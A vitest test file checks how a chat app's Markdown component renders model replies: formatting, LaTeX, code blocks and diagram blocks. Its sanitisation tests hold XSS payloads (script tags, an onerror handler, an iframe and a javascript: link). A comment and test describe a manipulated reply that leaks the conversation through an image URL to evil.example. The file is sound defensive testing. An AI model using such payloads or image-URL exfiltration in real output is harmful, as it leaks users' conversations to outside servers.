import { describe, it, expect } from 'vitest'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { Markdown, markdownComponents } from '@/components/chat/Markdown'
import { SceneContext } from '@/components/chat/SceneContext'
import { InlineText } from '@/components/ui/InlineText'

/**
 * A model reply arrives as markdown. Shown raw, a reply reads `**bold**`,
 * `### Heading` and a code block with its fences — and its line breaks
 * collapse into one paragraph. These tests render the component to HTML on
 * the server (no browser needed) and check what a reader would see.
 */
const md = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }))

/** Renders with SceneContext's `streaming` set, the way a live reply does (index.tsx). */
const mdStreaming = (text: string, streaming: boolean) =>
  renderToStaticMarkup(
    createElement(
      SceneContext.Provider,
      { value: { sessionId: null, messageId: null, fresh: false, model: null, streaming } },
      createElement(Markdown, { text }),
    ),
  )

describe('Markdown (model replies)', () => {
  it('renders bold, italic and inline code without their markers', () => {
    const html = md('Use **parallel** writes, *not* one `COPY` at a time.')
    expect(html).toContain('<strong>parallel</strong>')
    expect(html).toContain('<em>not</em>')
    expect(html).toContain('<code>COPY</code>')
    expect(html).not.toContain('**')
  })

  it('renders headings, lists, quotes and rules as real elements', () => {
    const html = md('## Why\n\n- one\n- two\n\n1. first\n2. second\n\n> quoted\n\n---\n\nend')
    expect(html).toContain('<h2>Why</h2>')
    expect(html).toMatch(/<ul>\s*<li>one<\/li>\s*<li>two<\/li>\s*<\/ul>/)
    expect(html).toMatch(/<ol>\s*<li>first<\/li>/)
    expect(html).toMatch(/<blockquote>\s*<p>quoted<\/p>\s*<\/blockquote>/)
    expect(html).toContain('<hr/>')
  })

  it('renders a table inside a scrollable wrapper', () => {
    const html = md('| a | b |\n|---|---|\n| 1 | 2 |')
    expect(html).toMatch(/<div class="md-table"><table>/)
    expect(html).toContain('<th>a</th>')
    expect(html).toContain('<td>2</td>')
  })

  it('gives a fenced code block a header with its language and a Copy button, and colours it', () => {
    const html = md('```python\ndef add(a, b):\n    return a + b\n```')
    expect(html).toContain('class="codeblock"')
    expect(html).toMatch(/class="codeblock-lang">python</)
    expect(html).toMatch(/<button[^>]*>Copy<\/button>/)
    expect(html).toContain('hljs-keyword')
  })

  it('labels a code block with no language "text", and does not guess colours', () => {
    const html = md('```\nplain words here\n```')
    expect(html).toMatch(/class="codeblock-lang">text</)
    expect(html).not.toContain('hljs-')
    expect(html).toContain('plain words here')
  })

  // Beyond highlight.js's common set, added because the user's chats use them.
  it('colours a Dockerfile', () => {
    expect(md('```dockerfile\nFROM node:20\nRUN npm ci\n```')).toContain('hljs-keyword')
  })

  it('shows an unknown language by name, uncoloured, without failing', () => {
    const html = md('```madeuplang\nx := 1\n```')
    expect(html).toMatch(/class="codeblock-lang">madeuplang</)
    expect(html).toContain('x := 1')
  })

  // Safe HTML is kept (GitHub's allow-list); dangerous HTML is removed, not shown.
  it('renders safe HTML tags', () => {
    const html = md('Hello <b>there</b>, x<sup>2</sup>, H<sub>2</sub>O, press <kbd>Ctrl</kbd>.')
    expect(html).toContain('<b>there</b>')
    expect(html).toContain('<sup>2</sup>')
    expect(html).toContain('<sub>2</sub>')
    expect(html).toContain('<kbd>Ctrl</kbd>')
    expect(html).not.toContain('&lt;')
  })

  it('removes dangerous HTML entirely, never runs or shows it', () => {
    const html = md('Hi <script>alert(1)</script><style>body{}</style><img src="x" onerror="alert(2)"><iframe src="https://evil.example"></iframe> end')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(1)')
    expect(html).not.toContain('<style')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('<iframe')
    expect(html).toContain('end')
  })

  // An image loads its URL the moment a reply is shown. A manipulated reply
  // can put the conversation into that URL and send it to a stranger's
  // server — so a reply never loads an image; it offers a link instead.
  it('never loads an image from a reply; a web image becomes a link', () => {
    const html = md('![sales chart](https://evil.example/p.png?q=secret) and <img src="https://evil.example/x.png" alt="pixel"> and <img src="x">')
    expect(html).not.toContain('<img')
    expect(html).toMatch(/<a href="https:\/\/evil\.example\/p\.png\?q=secret" target="_blank" rel="noopener noreferrer">image: sales chart<\/a>/)
    expect(html).toContain('image: pixel')
  })

  // The reply the user reported: <br> and $\bullet$ leaked as raw text.
  it('renders <br> and LaTeX bullets inside a table cell', () => {
    const html = md('| Risk | Control |\n|---|---|\n| Supply | $\\bullet$ Integration.<br>$\\bullet$ Ultramodern houses. |')
    expect(html).toMatch(/<td>.*<br\/>.*<\/td>/)
    expect(html).toContain('class="katex"')
    expect(html).not.toContain('&lt;br&gt;')
    expect(html).not.toContain('$')
  })

  it('renders inline and display LaTeX in every delimiter form', () => {
    const html = md('Inline $E = mc^2$ and \\(a^2\\).\n\n\\[x = \\sqrt{2}\\]\n\n$$\n\\sum_{i=1}^n i\n$$')
    expect(html.match(/class="katex"/g)?.length).toBe(4)
    expect(html.match(/class="katex-display"/g)?.length).toBe(2)
    expect(html).not.toContain('$')
  })

  it('leaves money as text', () => {
    const html = md('It costs $5 and $10 a month.')
    expect(html).toContain('It costs $5 and $10 a month.')
    expect(html).not.toContain('katex')
  })

  it('never reads $ inside code as math', () => {
    const html = md('Run `echo $HOME$` and:\n\n```bash\nexport A=$x$\n```')
    expect(html).not.toContain('katex')
    expect(html).toContain('$HOME$')
  })

  it('shows broken LaTeX as its source instead of failing', () => {
    const html = md('Bad $\\notacommand{x}$ here.')
    expect(html).toContain('notacommand')
    expect(html).toContain('here.')
  })

  it('drops a javascript: link target', () => {
    expect(md('[click](javascript:alert(1))')).not.toContain('javascript:')
  })

  it('opens web links in a new tab, safely', () => {
    const html = md('[docs](https://www.postgresql.org/docs/)')
    expect(html).toContain('href="https://www.postgresql.org/docs/"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
})

describe('scene blocks in a reply', () => {
  const block = (code: string) => '```scene\n' + code + '\n```'

  it('renders a diagram player instead of code', () => {
    const html = md(`Here:\n\n${block('play(create(axes()))')}`)
    expect(html).toContain('data-scene-index="0"')
    expect(html).toContain('Loading diagram')
    expect(html).not.toContain('play(create(axes()))') // not shown as a code block until asked
  })

  it('shows "Drawing…" for a block that is still streaming', () => {
    const html = mdStreaming('Here:\n\n```scene\nplay(create(ax', true)
    expect(html).toContain('Drawing…')
    expect(html).not.toContain('data-scene-index')
  })

  // Fix round 3: "Drawing…" used to show forever whenever remark found a
  // `scene` fence that `findSceneBlocks` doesn't — a fence inside a
  // blockquote, indented 4+ spaces under a list item, `- \`\`\`scene`, or a
  // reply cut off before its closing fence — because it only ever checked
  // "is this block matched", never whether the reply was still streaming.
  // Once streaming is over, nothing more is coming: an unmatched block must
  // fall back to an ordinary code block instead of spinning forever.
  it('renders a scene fence inside a blockquote as a code block once streaming is done, not "Drawing…" forever', () => {
    const html = mdStreaming('> ```scene\n> play(create(axes()))\n> ```', false)
    expect(html).not.toContain('Drawing…')
    expect(html).toMatch(/class="codeblock-lang">scene</)
  })

  it('renders an unclosed block as a code block once streaming is done, not "Drawing…" forever', () => {
    const html = mdStreaming('Here:\n\n```scene\nplay(create(ax', false)
    expect(html).not.toContain('Drawing…')
    expect(html).toMatch(/class="codeblock-lang">scene</)
  })

  it('still shows "Drawing…" for an unclosed block WHILE streaming', () => {
    const html = mdStreaming('Here:\n\n```scene\nplay(create(ax', true)
    expect(html).toContain('Drawing…')
    expect(html).not.toMatch(/class="codeblock-lang">scene</)
  })

  it(`renders at most ${2} players; later blocks stay code`, () => {
    const html = md([block('a()'), block('b()'), block('c()')].join('\n\n'))
    expect(html.match(/data-scene-index=/g)?.length).toBe(2)
    expect(html).toMatch(/class="codeblock-lang">scene</)
    expect(html).toContain('c()')
  })

  // Fix round 1, finding 2: a block was matched to its SceneBlock by comparing
  // its rendered code text, so two blocks with identical code both matched
  // the FIRST one — same index twice. Task 7's repair addresses a block by
  // index, so two identical blocks must still get two different indices.
  it('gives two blocks with identical code two different indices', () => {
    const html = md([block('play(create(axes()))'), block('play(create(axes()))')].join('\n\n'))
    expect(html).toContain('data-scene-index="0"')
    expect(html).toContain('data-scene-index="1"')
  })

  // Fix round 1, finding 1: `Markdown` used to build a fresh `components`
  // object (and so a fresh `pre` function) on every render via
  // `useMemo(() => componentsFor(text), [text])`. react-markdown treats
  // `components.pre` as a component TYPE: a new function identity per
  // streamed token unmounts and remounts every already-open ScenePlayer (a
  // new iframe, a new worker) on every token after it. `markdownComponents`
  // (and its `pre`) must now be a stable, module-level reference — this
  // cannot be observed as a remount from server-rendered HTML alone (no DOM,
  // no commit phase; a jsdom-based mount test was ruled out for this repo),
  // so this asserts the identity invariant that removing the per-render
  // factory guarantees: the very same reference, both before AND after
  // rendering two different replies through it.
  it('keeps pre a stable reference across renders (the remount this fixes)', () => {
    const before = markdownComponents.pre
    md(block('play(create(axes()))'))
    md('some other reply entirely, with a ```scene\nx()\n``` block too')
    expect(markdownComponents.pre).toBe(before)
    expect(markdownComponents.pre).toBe(markdownComponents.pre)
  })
})

describe('InlineText (stored sentences)', () => {
  const inline = (text: string) => renderToStaticMarkup(createElement(InlineText, { text }))

  it('shows bold, italic and code in a sentence without the markers', () => {
    const html = inline('The **17 Goals** use *targets* and `max.poll.records`.')
    expect(html).toContain('<strong>17 Goals</strong>')
    expect(html).toContain('<em>targets</em>')
    expect(html).toContain('<code>max.poll.records</code>')
    expect(html).not.toContain('**')
  })

  it('drops a heading marker at the start of a sentence', () => {
    expect(inline('### Why Postgres wins')).toBe('Why Postgres wins')
  })

  it('renders inline LaTeX in a sentence, keeping the words around it', () => {
    const html = inline('$\\bullet$ Integration with **Poultry Max**.')
    expect(html).toContain('class="katex"')
    expect(html).toContain('<strong>Poultry Max</strong>')
    expect(html).toContain(' Integration with ')
    expect(html).not.toContain('$')
  })

  it('leaves money in a sentence as text', () => {
    expect(inline('It costs $5 and $10.')).toBe('It costs $5 and $10.')
  })
})
